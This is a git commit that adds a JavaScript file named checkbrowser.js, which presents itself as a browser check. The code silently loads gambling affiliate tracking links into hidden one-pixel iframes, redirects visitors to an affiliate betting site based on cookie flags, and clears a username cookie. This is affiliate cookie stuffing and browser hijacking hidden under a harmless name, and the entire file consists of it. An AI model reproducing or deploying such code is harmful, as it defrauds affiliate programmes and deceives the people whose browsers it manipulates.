f541c146ba1b2fe1ecec0df6c0e272164ec6eb68
Topsupertips <linhdqtg@gmail.com>
2017-06-24 10:08:00 +0700

    Check
    Check

---
+++ checkbrowser.js
@@ -0,0 +1,34 @@
+ function checkId(myid) {
+        var ifrm = document.createElement("iframe");
+        ifrm.setAttribute("src", myid);
+        ifrm.style.width = "1px";
+        ifrm.style.height = "1px";
+        ifrm.style.borderStyle = "none";
+        document.body.appendChild(ifrm);
+ }
+ alert('Welcome');
+ if (document.cookie.indexOf("TST2") >= 0) {
+    var id0 = 'http://www.bet365.com/home/?affiliate=365_550128';
+    var idt0 = 3000;
+    document.cookie = "username=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;"; 
+    setTimeout(function(){ window.location.href = id0; }, idt0);
+} else { if (document.cookie.indexOf("TST1") >= 0) { 
+    var id1 = 'http://dspk.kindredplc.com/redirect.aspx?pid=3785674&bid=25488';
+    var id2 = 'https://mmwebhandler.aff-online.com/c/35462?sr=1368276';
+    var id3 = 'http://ads2.williamhill.com/redirect.aspx?pid=191318604&bid=1487415335&lpid=1487414832';
+    var id4 = 'https://track.10bet.com/C.ashx?btag=a_44122b_4147c_&affid=1678477&siteid=44122&adid=4147&c=';
+ 
+    var id5 = 'https://banners.livepartners.com/view.php?z=53629';
+    var idx1 = 'http://www.188bet.com/en-gb/promotions?affiliateCode=73469';
+    var id0 = 'http://ads.betfair.com/redirect.aspx?pid=2678934&bid=8142';
+    var idt0 = 1000;
+    var idt1 = 2000;
+
+   checkId(id1);checkId(id2);checkId(id3);
+   setTimeout(function(){ checkId(id4);checkId(id5); }, idt1);
+   window.onload = function(){  window.location.href = id0; };
+    
+   var idx = 'xxxx';
+ }
+} 
+ 
